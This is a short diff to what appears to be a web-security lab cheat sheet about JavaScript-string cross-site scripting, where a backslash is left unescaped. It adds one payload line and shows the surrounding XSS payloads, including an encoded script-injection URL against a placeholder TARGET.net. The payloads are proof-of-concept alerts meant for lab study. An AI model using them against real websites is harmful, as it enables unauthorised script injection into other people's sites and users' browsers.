@@ -708,6 +708,8 @@ location = "https://TARGET.net/?search=%3C%2FScRiPt+%3E%3Cimg+src%3Da+onerror%3D
 >See in `source code` the variable named ```searchTerms```, and when submitting payload ```fuzzer'payload```, see the single quote is backslash escaped, and then send a  ```fuzzer\payload``` payload and ***identify*** that the backslash is not escaped.  
 
 ```
+\';alert(1);//
+
 \'-alert(1)//  
 
 fuzzer\';console.log(12345);//  
